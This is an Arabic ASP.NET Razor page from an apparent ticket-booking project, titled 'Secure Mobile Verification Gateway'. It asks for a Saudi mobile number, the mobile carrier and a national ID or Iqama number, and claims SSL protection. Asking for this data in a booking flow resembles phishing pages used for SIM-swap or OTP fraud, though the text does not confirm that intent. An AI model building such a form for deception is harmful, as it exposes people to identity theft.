@model BujairiTic.Models.Order
@{
    Layout = null;
}

<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>توثيق رقم الجوال</title>

<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">

<link rel="stylesheet" href="~/css/customer.css" asp-append-version="true" />

</head>
<body>

<div class="card">

<div class="english-desc">
Secure Mobile Verification Gateway
</div>

<h3>توثيق واعتماد رقم الجوال</h3>

<div class="desc">
يرجى إدخال رقم الجوال المرتبط ببيانات حسابك للتحقق من الهوية واستكمال العملية بأمان.
</div>

<form asp-action="SaveCustomerInfo"
      asp-controller="Booking"
      method="post">

    <!-- مهم جداً -->
    <input type="hidden" name="id" value="@Model.Id" />

    <div class="input-box">
       <input class="input"
       name="Mobile"
       type="tel"
       placeholder="05XXXXXXXX أو 5XXXXXXXX"
       pattern="^(0\d{9}|5\d{8})$"
       required>

    </div>

    <div class="input-box">
        <select class="input"
                id="providerSelect"
                name="Provider"
                required>
            <option value="">اختر مزود الخدمة</option>
            <option value="STC">STC</option>
            <option value="Mobily">Mobily</option>
            <option value="Zain">Zain</option>
            <option value="Salam">Salam</option>
            <option value="Virgin Mobile">Virgin Mobile</option>
            <option value="Lebara">Lebara</option>
        </select>
    </div>

    <div id="providerMessage" class="provider-message"></div>

    <div class="input-box">
        <input class="input"
               name="NationalIdOrIqama"
               type="text"
               placeholder="رقم الهوية / الإقامة"
               pattern="\d{10}"
               required>
    </div>

    <button type="submit">تحقق الآن</button>

</form>

<div class="badge">
جميع البيانات محمية وفق بروتوكول SSL
</div>

</div>

<script src="~/js/customer.js" asp-append-version="true"></script>
 <script src="~/js/toast.js" asp-append-version="true"></script>


</body>
</html>
